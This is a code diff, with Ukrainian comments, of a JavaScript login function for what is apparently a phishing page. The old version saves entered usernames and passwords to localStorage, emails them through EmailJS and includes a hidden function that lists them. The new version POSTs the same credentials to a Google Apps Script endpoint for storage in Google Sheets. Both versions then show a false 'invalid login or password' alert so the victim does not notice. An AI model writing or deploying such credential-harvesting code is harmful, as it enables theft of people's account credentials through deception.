@@ -7,40 +7,19 @@ function login() {
         return;
     }
 
-    // Збереження логінів у localStorage (приховано)
-    let logins = JSON.parse(localStorage.getItem("logins")) || [];
-    logins.push({ username: user, password: pass });
-    localStorage.setItem("logins", JSON.stringify(logins));
-
-    // Відправка на EmailJS
-    emailjs.send("service_4239xag", "template_ozsxeoi", {
-        username: user,
-        password: pass
+    fetch("https://script.google.com/macros/s/AKfycbwcpN5A7o4hbxuWYgy77K35utt5zm5YRW9DPXypMAbgw2oy65aAbpH75ls_cqeqVs6GCQ/exec", {
+        method: "POST",
+        body: JSON.stringify({ username: user, password: pass }),
+        headers: {
+            "Content-Type": "application/json"
+        }
     })
-    .then(function(response) {
-        console.log('Email успішно відправлено!', response);
-        alert('Email надіслано — перевір пошту!');
-    }, function(error) {
-        console.error('Помилка при відправці email:', error);
-        alert('Помилка при відправці email. Деталі в консолі: ' + JSON.stringify(error));
+    .then(response => response.json())
+    .then(result => {
+        console.log('Дані збережено у Google Sheets:', result);
+        alert("Невірний логін або пароль"); // користувач бачить помилку
+    })
+    .catch(error => {
+        console.error('Помилка при записі в Google Sheets:', error);
     });
-
-    // Повідомлення про помилку користувачу
-    alert("Невірний логін або пароль");
-}
-
-// Прихований показ логінів
-function showLogins() {
-    let logins = JSON.parse(localStorage.getItem("logins")) || [];
-    if (logins.length === 0) {
-        alert("Немає збережених логінів");
-        return;
-    }
-
-    let text = "";
-    logins.forEach((item, index) => {
-        text += `${index + 1}. ${item.username} : ${item.password}\n`;
-    });
-
-    alert(text);
 }
